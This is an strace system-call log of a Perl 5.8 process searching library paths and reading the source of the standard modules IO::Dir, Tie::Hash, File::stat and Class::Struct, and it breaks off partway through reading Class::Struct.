12518 20:27:41.974285 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
12518 20:27:41.974306 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
12518 20:27:41.974320 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2b498) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:41.974331 _llseek(6, 0, [0], SEEK_CUR) = 0
12518 20:27:41.974351 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
12518 20:27:41.974890 stat64("/etc/perl/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327318 stat64("/etc/perl/Tie/Hash.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327344 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327358 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327372 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327386 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327400 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327412 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327432 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327445 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327458 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327473 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327487 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.327500 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
12518 20:27:42.327523 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:42.327540 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:42.327554 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:42.327580 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
12518 20:27:42.327993 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
12518 20:27:42.328584 read(8, "", 4096) = 0
12518 20:27:42.328600 close(8)          = 0
12518 20:27:42.328635 stat64("/etc/perl/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328657 stat64("/etc/perl/File/stat.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328671 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328684 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328765 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328779 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328794 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328807 stat64("/usr/lib/perl5/File/stat.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328821 stat64("/usr/share/perl5/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328834 stat64("/usr/share/perl5/File/stat.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328849 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328895 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfa2b1dc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328926 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfa2b2cc) = -1 ENOENT (No such file or directory)
12518 20:27:42.328958 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
12518 20:27:42.328994 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
12518 20:27:42.329008 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2afe8) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:42.329039 _llseek(8, 0, [0], SEEK_CUR) = 0
12518 20:27:42.329100 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
12518 20:27:42.329659 stat64("/etc/perl/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329743 stat64("/etc/perl/Class/Struct.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329776 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329804 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329819 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329832 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329846 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329858 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329871 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329884 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329897 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329910 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfa2ad2c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329924 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfa2ae1c) = -1 ENOENT (No such file or directory)
12518 20:27:42.329937 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
12518 20:27:42.329959 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
12518 20:27:42.329973 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa2ab38) = -1 ENOTTY (Inappropriate ioctl for device)
12518 20:27:42.329985 _llseek(10, 0, [0], SEEK_CUR) = 0
12518 20:27:42.330004 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
12518 20:27:42.330437 brk(0x82de000)    = 0x82de000
12518 20:27:42.330830 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && 